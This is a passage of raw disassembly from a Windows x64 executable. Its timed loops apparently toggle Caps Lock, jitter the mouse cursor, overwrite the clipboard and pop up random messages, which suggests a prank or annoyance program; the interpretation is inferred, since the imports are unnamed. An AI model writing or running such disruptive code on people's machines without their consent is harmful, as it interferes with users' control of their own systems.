   1400016c0:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400016c5:	48 3b c7             	cmp    %rdi,%rax
   1400016c8:	7d 0d                	jge    0x1400016d7
   1400016ca:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400016d0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400016d5:	eb 05                	jmp    0x1400016dc
   1400016d7:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400016dc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400016e1:	e8 6a 44 00 00       	call   0x140005b50
   1400016e6:	80 3d c7 b9 00 00 00 	cmpb   $0x0,0xb9c7(%rip)        # 0x14000d0b4
   1400016ed:	75 c7                	jne    0x1400016b6
   1400016ef:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400016f4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400016f9:	33 c9                	xor    %ecx,%ecx
   1400016fb:	48 83 c4 28          	add    $0x28,%rsp
   1400016ff:	48 ff 25 12 6c 00 00 	rex.W jmp *0x6c12(%rip)        # 0x140008318
   140001706:	cc                   	int3
   140001707:	cc                   	int3
   140001708:	cc                   	int3
   140001709:	cc                   	int3
   14000170a:	cc                   	int3
   14000170b:	cc                   	int3
   14000170c:	cc                   	int3
   14000170d:	cc                   	int3
   14000170e:	cc                   	int3
   14000170f:	cc                   	int3
   140001710:	4c 8b dc             	mov    %rsp,%r11
   140001713:	48 83 ec 68          	sub    $0x68,%rsp
   140001717:	80 3d 96 b9 00 00 00 	cmpb   $0x0,0xb996(%rip)        # 0x14000d0b4
   14000171e:	48 8d 05 d3 70 00 00 	lea    0x70d3(%rip),%rax        # 0x1400087f8
   140001725:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001729:	48 8d 05 e0 70 00 00 	lea    0x70e0(%rip),%rax        # 0x140008810
   140001730:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001734:	48 8d 05 ed 70 00 00 	lea    0x70ed(%rip),%rax        # 0x140008828
   14000173b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   14000173f:	0f 84 be 00 00 00    	je     0x140001803
   140001745:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001749:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001750:	ff ff 7f 
   140001753:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001757:	48 bd ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rbp
   14000175e:	ff ff 7f 
   140001761:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001765:	33 f6                	xor    %esi,%esi
   140001767:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000176b:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001770:	ff 15 7a 6e 00 00    	call   *0x6e7a(%rip)        # 0x1400085f0
   140001776:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000177d:	00 
   14000177e:	45 33 c9             	xor    %r9d,%r9d
   140001781:	44 8b c0             	mov    %eax,%r8d
   140001784:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001789:	b8 56 55 55 55       	mov    $0x55555556,%eax
   14000178e:	41 f7 e8             	imul   %r8d
   140001791:	8b ca                	mov    %edx,%ecx
   140001793:	c1 e9 1f             	shr    $0x1f,%ecx
   140001796:	03 d1                	add    %ecx,%edx
   140001798:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   14000179b:	44 2b c1             	sub    %ecx,%r8d
   14000179e:	48 8d 15 9b 70 00 00 	lea    0x709b(%rip),%rdx        # 0x140008840
   1400017a5:	4d 63 c0             	movslq %r8d,%r8
   1400017a8:	33 c9                	xor    %ecx,%ecx
   1400017aa:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   1400017af:	ff 15 13 6b 00 00    	call   *0x6b13(%rip)        # 0x1400082c8
   1400017b5:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400017ba:	e8 61 f8 ff ff       	call   0x140001020
   1400017bf:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400017c4:	48 3b c5             	cmp    %rbp,%rax
   1400017c7:	7d 0b                	jge    0x1400017d4
   1400017c9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400017cd:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1400017d2:	eb 05                	jmp    0x1400017d9
   1400017d4:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   1400017d9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400017de:	e8 6d 43 00 00       	call   0x140005b50
   1400017e3:	40 38 35 ca b8 00 00 	cmp    %sil,0xb8ca(%rip)        # 0x14000d0b4
   1400017ea:	75 84                	jne    0x140001770
   1400017ec:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400017f1:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400017f6:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400017fb:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001802:	00 
   140001803:	48 83 c4 68          	add    $0x68,%rsp
   140001807:	c3                   	ret
   140001808:	cc                   	int3
   140001809:	cc                   	int3
   14000180a:	cc                   	int3
   14000180b:	cc                   	int3
   14000180c:	cc                   	int3
   14000180d:	cc                   	int3
   14000180e:	cc                   	int3
   14000180f:	cc                   	int3
   140001810:	48 83 ec 38          	sub    $0x38,%rsp
   140001814:	45 33 c9             	xor    %r9d,%r9d
   140001817:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000181e:	00 00 
   140001820:	4c 8d 05 21 71 00 00 	lea    0x7121(%rip),%r8        # 0x140008948
   140001827:	33 c9                	xor    %ecx,%ecx
   140001829:	48 8d 15 20 70 00 00 	lea    0x7020(%rip),%rdx        # 0x140008850
   140001830:	ff 15 fa 6d 00 00    	call   *0x6dfa(%rip)        # 0x140008630
   140001836:	80 3d 77 b8 00 00 00 	cmpb   $0x0,0xb877(%rip)        # 0x14000d0b4
   14000183d:	0f 84 8d 00 00 00    	je     0x1400018d0
   140001843:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001848:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000184f:	ff ff 7f 
   140001852:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001857:	48 be ff 1b f4 ab fd 	movabs $0x7ffffffdabf41bff,%rsi
   14000185e:	ff ff 7f 
   140001861:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001866:	48 bf 00 e4 0b 54 02 	movabs $0x2540be400,%rdi
   14000186d:	00 00 00 
   140001870:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001876:	4c 8d 05 cb 70 00 00 	lea    0x70cb(%rip),%r8        # 0x140008948
   14000187d:	33 d2                	xor    %edx,%edx
   14000187f:	b9 14 00 00 00       	mov    $0x14,%ecx
   140001884:	ff 15 96 6a 00 00    	call   *0x6a96(%rip)        # 0x140008320
   14000188a:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000188f:	e8 8c f7 ff ff       	call   0x140001020
   140001894:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001899:	48 3b c6             	cmp    %rsi,%rax
   14000189c:	7d 0b                	jge    0x1400018a9
   14000189e:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400018a2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400018a7:	eb 05                	jmp    0x1400018ae
   1400018a9:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400018ae:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400018b3:	e8 98 42 00 00       	call   0x140005b50
   1400018b8:	80 3d f5 b7 00 00 00 	cmpb   $0x0,0xb7f5(%rip)        # 0x14000d0b4
   1400018bf:	75 af                	jne    0x140001870
   1400018c1:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400018c6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400018cb:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400018d0:	48 83 c4 38          	add    $0x38,%rsp
   1400018d4:	c3                   	ret
   1400018d5:	cc                   	int3
   1400018d6:	cc                   	int3
   1400018d7:	cc                   	int3
   1400018d8:	cc                   	int3
   1400018d9:	cc                   	int3
   1400018da:	cc                   	int3
   1400018db:	cc                   	int3
   1400018dc:	cc                   	int3
   1400018dd:	cc                   	int3
   1400018de:	cc                   	int3
   1400018df:	cc                   	int3
   1400018e0:	48 83 ec 68          	sub    $0x68,%rsp
   1400018e4:	48 8b 05 55 b7 00 00 	mov    0xb755(%rip),%rax        # 0x14000d040
   1400018eb:	48 33 c4             	xor    %rsp,%rax
   1400018ee:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400018f3:	33 d2                	xor    %edx,%edx
   1400018f5:	48 8d 0d 64 70 00 00 	lea    0x7064(%rip),%rcx        # 0x140008960
   1400018fc:	ff 15 ae 6a 00 00    	call   *0x6aae(%rip)        # 0x1400083b0
   140001902:	80 3d ab b7 00 00 00 	cmpb   $0x0,0xb7ab(%rip)        # 0x14000d0b4
   140001909:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000190e:	c7 44 24 30 20 00 00 	movl   $0x20,0x30(%rsp)
   140001915:	00 
   140001916:	c7 44 24 40 0f 00 00 	movl   $0xf,0x40(%rsp)
   14000191d:	00 
   14000191e:	c7 44 24 44 ff ff ff 	movl   $0xffffffff,0x44(%rsp)
   140001925:	ff 
   140001926:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   14000192d:	00 
   14000192e:	74 6e                	je     0x14000199e
   140001930:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001935:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000193c:	ff ff 7f 
   14000193f:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140001944:	48 bf ff 6b ca 88 ff 	movabs $0x7fffffff88ca6bff,%rdi
   14000194b:	ff ff 7f 
   14000194e:	66 90                	xchg   %ax,%ax
   140001950:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001955:	ff 15 45 6a 00 00    	call   *0x6a45(%rip)        # 0x1400083a0
   14000195b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001960:	e8 bb f6 ff ff       	call   0x140001020
   140001965:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000196a:	48 3b c7             	cmp    %rdi,%rax
   14000196d:	7d 0d                	jge    0x14000197c
   14000196f:	48 05 00 94 35 77    	add    $0x77359400,%rax
   140001975:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000197a:	eb 05                	jmp    0x140001981
   14000197c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001981:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001986:	e8 c5 41 00 00       	call   0x140005b50
   14000198b:	80 3d 22 b7 00 00 00 	cmpb   $0x0,0xb722(%rip)        # 0x14000d0b4
   140001992:	75 bc                	jne    0x140001950
   140001994:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140001999:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000199e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400019a3:	48 33 cc             	xor    %rsp,%rcx
   1400019a6:	e8 d5 4f 00 00       	call   0x140006980
   1400019ab:	48 83 c4 68          	add    $0x68,%rsp
   1400019af:	c3                   	ret
   1400019b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400019b4:	80 3d f9 b6 00 00 00 	cmpb   $0x0,0xb6f9(%rip)        # 0x14000d0b4
   1400019bb:	0f 84 88 00 00 00    	je     0x140001a49
   1400019c1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400019c6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400019cd:	ff ff 7f 
   1400019d0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400019d5:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400019dc:	ff ff 7f 
   1400019df:	90                   	nop
   1400019e0:	45 33 c9             	xor    %r9d,%r9d
   1400019e3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400019e9:	b2 3a                	mov    $0x3a,%dl
   1400019eb:	b1 14                	mov    $0x14,%cl
   1400019ed:	ff 15 5d 69 00 00    	call   *0x695d(%rip)        # 0x140008350
   1400019f3:	45 33 c9             	xor    %r9d,%r9d
   1400019f6:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400019fc:	b2 3a                	mov    $0x3a,%dl
   1400019fe:	b1 14                	mov    $0x14,%cl
   140001a00:	ff 15 4a 69 00 00    	call   *0x694a(%rip)        # 0x140008350
   140001a06:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001a0b:	e8 10 f6 ff ff       	call   0x140001020
   140001a10:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001a15:	48 3b c7             	cmp    %rdi,%rax
   140001a18:	7d 0d                	jge    0x140001a27
   140001a1a:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001a20:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001a25:	eb 05                	jmp    0x140001a2c
   140001a27:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001a2c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001a31:	e8 1a 41 00 00       	call   0x140005b50
   140001a36:	80 3d 77 b6 00 00 00 	cmpb   $0x0,0xb677(%rip)        # 0x14000d0b4
   140001a3d:	75 a1                	jne    0x1400019e0
   140001a3f:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001a44:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001a49:	48 83 c4 28          	add    $0x28,%rsp
   140001a4d:	c3                   	ret
   140001a4e:	cc                   	int3
   140001a4f:	cc                   	int3
   140001a50:	4c 8b dc             	mov    %rsp,%r11
   140001a53:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001a5a:	48 8b 05 df b5 00 00 	mov    0xb5df(%rip),%rax        # 0x14000d040
   140001a61:	48 33 c4             	xor    %rsp,%rax
   140001a64:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140001a69:	80 3d 44 b6 00 00 00 	cmpb   $0x0,0xb644(%rip)        # 0x14000d0b4
   140001a70:	0f 84 b7 01 00 00    	je     0x140001c2d
   140001a76:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140001a7a:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   140001a7e:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001a85:	ff ff 7f 
   140001a88:	49 89 73 18          	mov    %rsi,0x18(%r11)
   140001a8c:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   140001a90:	4d 89 63 f8          	mov    %r12,-0x8(%r11)
   140001a94:	49 bc 7f 3c 36 fe ff 	movabs $0x7ffffffffe363c7f,%r12
   140001a9b:	ff ff 7f 
   140001a9e:	4d 89 73 f0          	mov    %r14,-0x10(%r11)
   140001aa2:	45 33 f6             	xor    %r14d,%r14d
   140001aa5:	4d 89 7b e8          	mov    %r15,-0x18(%r11)
   140001aa9:	49 bf ff d2 ce fe ff 	movabs $0x7ffffffffeced2ff,%r15
   140001ab0:	ff ff 7f 
   140001ab3:	ff 15 07 69 00 00    	call   *0x6907(%rip)        # 0x1400083c0
   140001ab9:	48 8b f0             	mov    %rax,%rsi
   140001abc:	48 85 c0             	test   %rax,%rax
   140001abf:	0f 84 f9 00 00 00    	je     0x140001bbe
   140001ac5:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001aca:	48 8b c8             	mov    %rax,%rcx
   140001acd:	ff 15 25 68 00 00    	call   *0x6825(%rip)        # 0x1400082f8
   140001ad3:	85 c0                	test   %eax,%eax
   140001ad5:	0f 84 e3 00 00 00    	je     0x140001bbe
   140001adb:	bb 0a 00 00 00       	mov    $0xa,%ebx
   140001ae0:	ff 15 0a 6b 00 00    	call   *0x6b0a(%rip)        # 0x1400085f0
   140001ae6:	44 8b c0             	mov    %eax,%r8d
   140001ae9:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001aee:	41 f7 e8             	imul   %r8d
   140001af1:	c1 fa 03             	sar    $0x3,%edx
   140001af4:	8b ca                	mov    %edx,%ecx
   140001af6:	c1 e9 1f             	shr    $0x1f,%ecx
   140001af9:	03 d1                	add    %ecx,%edx
   140001afb:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001afe:	c1 e1 02             	shl    $0x2,%ecx
   140001b01:	44 2b c1             	sub    %ecx,%r8d
   140001b04:	41 8d 78 f6          	lea    -0xa(%r8),%edi
   140001b08:	ff 15 e2 6a 00 00    	call   *0x6ae2(%rip)        # 0x1400085f0
   140001b0e:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b13:	44 8b c0             	mov    %eax,%r8d
   140001b16:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001b1b:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001b22:	00 
   140001b23:	41 f7 e8             	imul   %r8d
   140001b26:	41 83 c1 f6          	add    $0xfffffff6,%r9d
   140001b2a:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001b2f:	c1 fa 03             	sar    $0x3,%edx
   140001b32:	8b ca                	mov    %edx,%ecx
   140001b34:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001b39:	c1 e9 1f             	shr    $0x1f,%ecx
   140001b3c:	03 d1                	add    %ecx,%edx
   140001b3e:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001b41:	33 d2                	xor    %edx,%edx
   140001b43:	c1 e1 02             	shl    $0x2,%ecx
   140001b46:	44 2b c1             	sub    %ecx,%r8d
   140001b49:	48 8b ce             	mov    %rsi,%rcx
   140001b4c:	45 03 c8             	add    %r8d,%r9d
   140001b4f:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001b54:	44 03 c7             	add    %edi,%r8d
   140001b57:	ff 15 e3 67 00 00    	call   *0x67e3(%rip)        # 0x140008340
   140001b5d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001b62:	e8 b9 f4 ff ff       	call   0x140001020
   140001b67:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001b6c:	49 3b c4             	cmp    %r12,%rax
   140001b6f:	7d 0d                	jge    0x140001b7e
   140001b71:	48 05 80 c3 c9 01    	add    $0x1c9c380,%rax
   140001b77:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001b7c:	eb 05                	jmp    0x140001b83
   140001b7e:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001b83:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001b88:	e8 c3 3f 00 00       	call   0x140005b50
   140001b8d:	48 83 eb 01          	sub    $0x1,%rbx
   140001b91:	0f 85 49 ff ff ff    	jne    0x140001ae0
   140001b97:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b9c:	33 d2                	xor    %edx,%edx
   140001b9e:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001ba3:	48 8b ce             	mov    %rsi,%rcx
   140001ba6:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001bad:	00 
   140001bae:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001bb3:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001bb8:	ff 15 82 67 00 00    	call   *0x6782(%rip)        # 0x140008340
   140001bbe:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001bc3:	e8 58 f4 ff ff       	call   0x140001020
   140001bc8:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001bcd:	49 3b c7             	cmp    %r15,%rax
   140001bd0:	7d 0d                	jge    0x140001bdf
   140001bd2:	48 05 00 2d 31 01    	add    $0x1312d00,%rax
   140001bd8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001bdd:	eb 05                	jmp    0x140001be4
   140001bdf:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001be4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001be9:	e8 62 3f 00 00       	call   0x140005b50
   140001bee:	44 38 35 bf b4 00 00 	cmp    %r14b,0xb4bf(%rip)        # 0x14000d0b4
   140001bf5:	0f 85 b8 fe ff ff    	jne    0x140001ab3
   140001bfb:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140001c00:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   140001c05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140001c0c:	00 
   140001c0d:	48 8b bc 24 a8 00 00 	mov    0xa8(%rsp),%rdi
   140001c14:	00 
   140001c15:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140001c1c:	00 
   140001c1d:	48 8b ac 24 98 00 00 	mov    0x98(%rsp),%rbp
   140001c24:	00 
   140001c25:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140001c2c:	00 
   140001c2d:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001c32:	48 33 cc             	xor    %rsp,%rcx
   140001c35:	e8 46 4d 00 00       	call   0x140006980
   140001c3a:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001c41:	c3                   	ret
   140001c42:	cc                   	int3
   140001c43:	cc                   	int3
   140001c44:	cc                   	int3
   140001c45:	cc                   	int3
   140001c46:	cc                   	int3
   140001c47:	cc                   	int3
   140001c48:	cc                   	int3
   140001c49:	cc                   	int3
   140001c4a:	cc                   	int3
   140001c4b:	cc                   	int3
   140001c4c:	cc                   	int3
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	4c 8b dc             	mov    %rsp,%r11
   140001c53:	48 83 ec 68          	sub    $0x68,%rsp
   140001c57:	80 3d 56 b4 00 00 00 	cmpb   $0x0,0xb456(%rip)        # 0x14000d0b4
   140001c5e:	48 8d 05 1b 6d 00 00 	lea    0x6d1b(%rip),%rax        # 0x140008980
   140001c65:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001c69:	48 8d 05 40 6d 00 00 	lea    0x6d40(%rip),%rax        # 0x1400089b0
   140001c70:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001c74:	48 8d 05 65 6d 00 00 	lea    0x6d65(%rip),%rax        # 0x1400089e0
   140001c7b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140001c7f:	48 8d 05 aa 6d 00 00 	lea    0x6daa(%rip),%rax        # 0x140008a30
   140001c86:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140001c8a:	0f 84 b9 00 00 00    	je     0x140001d49
   140001c90:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001c94:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001c9b:	ff ff 7f 
   140001c9e:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001ca2:	48 bd ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%rbp
   140001ca9:	ff ff 7f 
   140001cac:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001cb0:	33 f6                	xor    %esi,%esi
   140001cb2:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   140001cb6:	48 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%rdi
   140001cbd:	00 00 00 
   140001cc0:	ff 15 2a 69 00 00    	call   *0x692a(%rip)        # 0x1400085f0
   140001cc6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001ccb:	7d 07                	jge    0x140001cd4
   140001ccd:	ff c8                	dec    %eax
   140001ccf:	83 c8 fc             	or     $0xfffffffc,%eax
   140001cd2:	ff c0                	inc    %eax
   140001cd4:	4c 63 c0             	movslq %eax,%r8
   140001cd7:	48 8d 15 62 6b 00 00 	lea    0x6b62(%rip),%rdx        # 0x140008840
   140001cde:	c7 44 24 28 0a 00 00 	movl   $0xa,0x28(%rsp)
   140001ce5:	00 
   140001ce6:	45 33 c9             	xor    %r9d,%r9d
   140001ce9:	33 c9                	xor    %ecx,%ecx
   140001ceb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001cf0:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   140001cf5:	ff 15 cd 65 00 00    	call   *0x65cd(%rip)        # 0x1400082c8
   140001cfb:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140001d00:	e8 1b f3 ff ff       	call   0x140001020
   140001d05:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140001d0a:	48 3b c5             	cmp    %rbp,%rax
   140001d0d:	7d 0b                	jge    0x140001d1a
   140001d0f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001d13:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140001d18:	eb 05                	jmp    0x140001d1f
   140001d1a:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001d1f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001d24:	e8 27 3e 00 00       	call   0x140005b50
   140001d29:	40 38 35 84 b3 00 00 	cmp    %sil,0xb384(%rip)        # 0x14000d0b4
   140001d30:	75 8e                	jne    0x140001cc0
   140001d32:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140001d37:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140001d3c:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140001d41:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001d48:	00 
   140001d49:	48 83 c4 68          	add    $0x68,%rsp
   140001d4d:	c3                   	ret
   140001d4e:	cc                   	int3
   140001d4f:	cc                   	int3
   140001d50:	48 83 ec 28          	sub    $0x28,%rsp
   140001d54:	80 3d 59 b3 00 00 00 	cmpb   $0x0,0xb359(%rip)        # 0x14000d0b4
   140001d5b:	0f 84 d4 00 00 00    	je     0x140001e35
   140001d61:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140001d66:	48 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rsi
   140001d6d:	ff ff 7f 
   140001d70:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001d75:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   140001d7c:	ff ff 7f 
   140001d7f:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001d84:	33 c9                	xor    %ecx,%ecx
   140001d86:	ff 15 e4 65 00 00    	call   *0x65e4(%rip)        # 0x140008370
   140001d8c:	85 c0                	test   %eax,%eax
   140001d8e:	74 59                	je     0x140001de9
   140001d90:	ff 15 f2 65 00 00    	call   *0x65f2(%rip)        # 0x140008388
   140001d96:	ba 12 00 00 00       	mov    $0x12,%edx
   140001d9b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001da0:	ff 15 72 63 00 00    	call   *0x6372(%rip)        # 0x140008118
   140001da6:	48 8b d8             	mov    %rax,%rbx
   140001da9:	48 85 c0             	test   %rax,%rax
   140001dac:	74 35                	je     0x140001de3
   140001dae:	48 8b c8             	mov    %rax,%rcx
   140001db1:	ff 15 89 63 00 00    	call   *0x6389(%rip)        # 0x140008140
   140001db7:	0f 10 05 ca 6c 00 00 	movups 0x6cca(%rip),%xmm0        # 0x140008a88
   140001dbe:	0f 11 00             	movups %xmm0,(%rax)
   140001dc1:	0f b7 0d d0 6c 00 00 	movzwl 0x6cd0(%rip),%ecx        # 0x140008a98
   140001dc8:	66 89 48 10          	mov    %cx,0x10(%rax)
   140001dcc:	48 8b cb             	mov    %rbx,%rcx
   140001dcf:	ff 15 ab 62 00 00    	call   *0x62ab(%rip)        # 0x140008080
   140001dd5:	48 8b d3             	mov    %rbx,%rdx
   140001dd8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140001ddd:	ff 15 c5 65 00 00    	call   *0x65c5(%rip)        # 0x1400083a8
   140001de3:	ff 15 97 65 00 00    	call   *0x6597(%rip)        # 0x140008380
   140001de9:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001dee:	e8 2d f2 ff ff       	call   0x140001020
   140001df3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001df8:	48 3b c6             	cmp    %rsi,%rax
   140001dfb:	7d 0d                	jge    0x140001e0a
   140001dfd:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001e03:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001e08:	eb 05                	jmp    0x140001e0f
   140001e0a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001e0f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001e14:	e8 37 3d 00 00       	call   0x140005b50
   140001e19:	80 3d 94 b2 00 00 00 	cmpb   $0x0,0xb294(%rip)        # 0x14000d0b4
   140001e20:	0f 85 5e ff ff ff    	jne    0x140001d84
   140001e26:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001e2b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001e30:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001e35:	48 83 c4 28          	add    $0x28,%rsp
   140001e39:	c3                   	ret
   140001e3a:	cc                   	int3
   140001e3b:	cc                   	int3
   140001e3c:	cc                   	int3
   140001e3d:	cc                   	int3
   140001e3e:	cc                   	int3
